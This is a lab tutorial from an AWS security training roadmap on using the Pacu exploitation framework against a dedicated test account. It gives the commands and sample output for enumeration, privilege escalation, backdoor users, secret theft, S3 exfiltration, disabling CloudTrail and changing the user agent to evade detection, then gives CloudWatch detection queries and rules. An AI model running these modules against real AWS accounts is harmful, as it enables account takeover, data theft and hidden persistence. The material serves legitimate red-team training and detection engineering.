# 🦜 Pacu — AWS Exploitation Framework

> **Phase 4 · Document 26 of 29**  
> **Estimated cost:** Free · **Estimated time:** 60–90 minutes  
> **Prerequisites:** All Phase 4 documents, `22-cloudgoat-lab-setup.md`  
> ⚠️ **Only against your dedicated attack account**

---

## What Is Pacu?

Pacu is an open-source AWS exploitation framework built by Rhino Security Labs — essentially Metasploit for AWS. It automates reconnaissance, privilege escalation, persistence, and exfiltration attacks against AWS environments.

```
Pacu Framework
      │
      ├── 30+ attack modules
      ├── Session management (stores credentials, findings)
      ├── Automated enumeration
      ├── Privilege escalation detection
      └── Data exfiltration automation
```

> Understanding Pacu from an attacker perspective makes you a better defender — you will know exactly what automated attacks look like in CloudTrail and how to detect them.

---

## Step 1 — Install Pacu

On your attack machine (Kali or Ubuntu):

```bash
# Install dependencies
sudo apt install -y python3 python3-pip git

# Clone Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install Python requirements
pip3 install -r requirements.txt

# Launch Pacu
python3 pacu.py
```

---

## Step 2 — Set Up a Pacu Session

Pacu uses sessions to manage multiple engagements:

```
Pacu v1.x  (https://github.com/RhinoSecurityLabs/pacu)
 [*] No sessions found.
 
Pacu (No session) > new_session
 [*] Session name: lab-attack-session

Pacu (lab-attack-session) > set_keys
 [*] Setting keys for lab-attack-session...
 Access key ID: AKIAIOSFODNN7EXAMPLE
 Secret access key: wJalrXUtnFEMI...
 Session token [Leave blank if not using STS]: 
 Key alias [default]: dev-alice-stolen
```

Verify the session:

```
Pacu (lab-attack-session) > whoami
{
  "UserName": "dev-alice",
  "UserId": "AIDAIOSFODNN7EXAMPLE",
  "AccountId": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/dev-alice"
}
```

---

## Step 3 — Enumerate Everything

Pacu's `enum` modules map the entire account:

```
# Enumerate all IAM entities
Pacu (lab-attack-session) > run iam__enum_permissions

# Enumerate all EC2 resources
Pacu (lab-attack-session) > run ec2__enum

# Enumerate all S3 buckets
Pacu (lab-attack-session) > run s3__bucket_finder

# Enumerate Lambda functions
Pacu (lab-attack-session) > run lambda__enum

# Enumerate all services across all regions
Pacu (lab-attack-session) > run aws__enum_account
```

View everything Pacu has collected:

```
Pacu (lab-attack-session) > data
Pacu (lab-attack-session) > data IAM
Pacu (lab-attack-session) > data EC2
```

---

## Step 4 — Privilege Escalation Detection

Pacu automatically identifies which of the 21 privilege escalation paths are available:

```
Pacu (lab-attack-session) > run iam__privesc_scan
```

Output:

```
[*] Checking for privilege escalation methods...

[!] Potential escalation methods found:

  1. iam:CreatePolicyVersion
     Current user can create new policy versions
     Path: Create new policy version with admin access

  2. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction  
     Can create Lambda with admin role and invoke it
     Path: Create malicious Lambda → invoke → gain admin

  3. iam:AttachUserPolicy
     Can attach policies directly to users
     Path: Attach AdministratorAccess to self

[*] Run `run iam__privesc_by_<method>` to exploit
```

Exploit a found path:

```
Pacu (lab-attack-session) > run iam__privesc_by_attach_policy
  [*] Attaching AdministratorAccess to dev-alice...
  [+] Success! dev-alice now has administrator access

# Verify
Pacu (lab-attack-session) > whoami
Pacu (lab-attack-session) > run iam__enum_permissions
```

---

## Step 5 — Persistence Modules

After gaining admin access, establish persistence (in your own lab):

```
# Create a backdoor IAM user
Pacu (lab-attack-session) > run iam__backdoor_users_keys
  [*] Creating backdoor user: pacu-backdoor
  [*] Attaching AdministratorAccess...
  [+] Backdoor created. Keys saved to session.

# Add a backdoor to existing Lambda function
Pacu (lab-attack-session) > run lambda__backdoor_new_roles
  [*] Creating new Lambda execution role with admin access...

# Create access keys for existing admin users
Pacu (lab-attack-session) > run iam__backdoor_users_password
```

---

## Step 6 — Reconnaissance Modules

```
# Find secrets in EC2 user-data scripts
Pacu (lab-attack-session) > run ec2__startup_shell_script
  [*] Checking user-data for all instances...
  [!] Found credentials in i-1234567890abcdef0 user-data:
      DB_PASSWORD=supersecret123

# Find exposed EBS snapshots (publicly shared)
Pacu (lab-attack-session) > run ebs__enum_snapshots_unauth
  [*] Searching for public EBS snapshots...

# Find secrets in CloudFormation template parameters
Pacu (lab-attack-session) > run cloudformation__download_data
  [*] Downloading all CloudFormation templates...
  [!] Found hardcoded credentials in template: stack-prod

# Enumerate RDS instances and check for public accessibility
Pacu (lab-attack-session) > run rds__enum
```

---

## Step 7 — Exfiltration Modules

```
# Download all accessible S3 data
Pacu (lab-attack-session) > run s3__download_bucket
  Bucket: lab-private-yourname-2024
  [*] Downloading 47 objects...
  [+] Data saved to: /pacu/sessions/lab-attack-session/downloads/s3/

# Extract secrets from Secrets Manager
Pacu (lab-attack-session) > run secretsmanager__credential_hunting
  [*] Listing all secrets...
  [*] Retrieving secret values...
  [+] Found 3 secrets:
      lab/database/credentials: {"username":"admin","password":"P@ssW0rD!"}
      lab/api/external-service: {"api_key":"sk-lab-test-key-abc123"}

# Exfiltrate CloudTrail logs (attacker covering tracks research)
Pacu (lab-attack-session) > run cloudtrail__download_event_history
```

---

## Step 8 — Defense Evasion Modules

These are modules an attacker uses to avoid detection. Study them to build better detections:

```
# Disrupt CloudTrail logging
Pacu (lab-attack-session) > run cloudtrail__disruption
  Methods available:
  1. Stop logging
  2. Delete trail
  3. Disable specific event selectors
  4. Create new trail to attacker-controlled S3 bucket

# Reduce GuardDuty effectiveness
Pacu (lab-attack-session) > run guardduty__list_accounts
  [*] Check if GuardDuty master can be manipulated...

# Enumerate and suppress Security Hub findings
Pacu (lab-attack-session) > run detection__disruption
```

> **Blue team action:** For every evasion module you run, add a CloudWatch alert to detect it. If Pacu can disable CloudTrail, you need an alert that fires the moment `StopLogging` is called.

---

## Step 9 — What Pacu Looks Like in CloudTrail

Switch to defender mode after running Pacu attacks:

```sql
-- CloudWatch Logs Insights
-- Find the Pacu user-agent signature
fields eventTime, eventName, userAgent, sourceIPAddress
| filter userAgent like /Pacu/
| sort eventTime asc
```

Pacu uses `Pacu/x.x.x` as its user agent by default — easy to detect.

Real attackers change the user agent:

```python
# In Pacu config, change user agent to blend in
# pacu/core/config.py
USER_AGENT = "Boto3/1.26.0 Python/3.10.0 Linux/5.15.0"
```

Now query for the suspicious behavior pattern instead of the user agent:

```sql
-- Detect Pacu-like enumeration pattern (many Describe/List calls rapidly)
fields userIdentity.userName, eventName, @timestamp
| filter eventName like /^(List|Describe|Get)/
| stats count(*) as apiCalls by bin(1m), userIdentity.userName
| filter apiCalls > 20
| sort apiCalls desc
```

More than 20 List/Describe calls per minute from one identity = automated enumeration tool.

---

## Step 10 — Build Detection Rules from Attack Patterns

After running Pacu, review CloudTrail and build specific detections:

| Pacu module | CloudTrail signature | Detection rule |
|-------------|---------------------|---------------|
| `iam__enum_permissions` | Mass `GetPolicy`, `ListPolicies`, `SimulatePrincipalPolicy` | >10 IAM enum calls/min |
| `iam__privesc_scan` | `GetPolicyVersion` for all policy versions | Checking all versions of multiple policies |
| `ec2__startup_shell_script` | `DescribeInstanceAttribute` for many instances | Bulk attribute requests |
| `s3__download_bucket` | Mass `GetObject` from S3 | >100 GetObject in 5 min |
| `secretsmanager__credential_hunting` | `ListSecrets` + many `GetSecretValue` | >5 GetSecretValue in 1 min |
| `cloudtrail__disruption` | `StopLogging` or `DeleteTrail` | ANY occurrence → critical alert |

---

## Pacu vs Manual Attacks — When to Use Each

| Situation | Use |
|-----------|-----|
| Learning attack techniques | Manual (understand each step) |
| Rapid privilege escalation path discovery | Pacu `iam__privesc_scan` |
| CTF / time-constrained engagement | Pacu |
| Building detection rules | Manual (understand the exact API calls) |
| Demonstrating attack surface to management | Pacu (comprehensive, fast) |
| Deep investigation of a specific vulnerability | Manual |

---

## Phase 4 Complete 🎉

You now have full red team capabilities on AWS:

- [x] CloudGoat — vulnerable by design lab scenarios
- [x] IAM privilege escalation — 12+ attack paths
- [x] IMDS attack and hardening — SSRF to credential theft
- [x] S3 misconfiguration attacks — enumeration to exfiltration
- [x] Pacu framework — automated AWS exploitation

**Next:** Capstone — Enterprise Replica Environment  
Start with: `27-enterprise-architecture-overview.md`

---

## Cleanup

```bash
# In Pacu — remove all persistence mechanisms
Pacu (lab-attack-session) > run iam__backdoor_users_keys --cleanup

# Verify no backdoor users remain
aws iam list-users --profile cloudgoat

# Delete Pacu session data
rm -rf pacu/sessions/lab-attack-session/

# In AWS — destroy all CloudGoat scenarios
python3 cloudgoat.py destroy all
```

---

*Phase 4 · AWS Cybersecurity & Digital Forensics Roadmap*
